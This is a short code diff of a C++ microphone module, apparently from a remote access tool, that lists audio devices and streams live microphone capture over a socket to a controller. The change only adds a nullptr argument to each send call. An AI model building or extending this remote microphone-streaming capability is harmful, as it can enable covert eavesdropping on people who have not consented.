@@ -41,13 +41,13 @@ void Mod_Mic::m_Enviar_Dispositivos() {
             strSalida.append(1, CMD_DEL);
         }
         strSalida = strSalida.substr(0, strSalida.size() - 1);
-        cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false);
+        cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false, nullptr);
     }
     else {
         strSalida = "No hay dispositivos";
     }
 
-    cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false);
+    cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false, nullptr);
 }
 
 void Mod_Mic::m_EmpezarLive() {
@@ -143,7 +143,7 @@ void Mod_Mic::m_LiveMicTh() {
 
             std::memcpy(newBuffer + iHeaderSize, headers.lpData, headers.dwBufferLength);
                 
-            cCliente->cSend(this->sckSocket, newBuffer, iBuffsize, 0, true);
+            cCliente->cSend(this->sckSocket, newBuffer, iBuffsize, 0, true, nullptr);
 
             if (waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
                 break;
@@ -171,7 +171,7 @@ void Mod_Mic::m_LiveMicTh() {
     strMSG.append(1, CMD_DEL);
     strMSG.append(1, '0');
 
-    cCliente->cSend(cCliente->sckSocket, strMSG.c_str(), strMSG.size(), 0, false);
+    cCliente->cSend(cCliente->sckSocket, strMSG.c_str(), strMSG.size(), 0, false, nullptr);
 
     strMSG = "[!] thLiveMicTh finalizada";
     DebugPrint(strMSG);
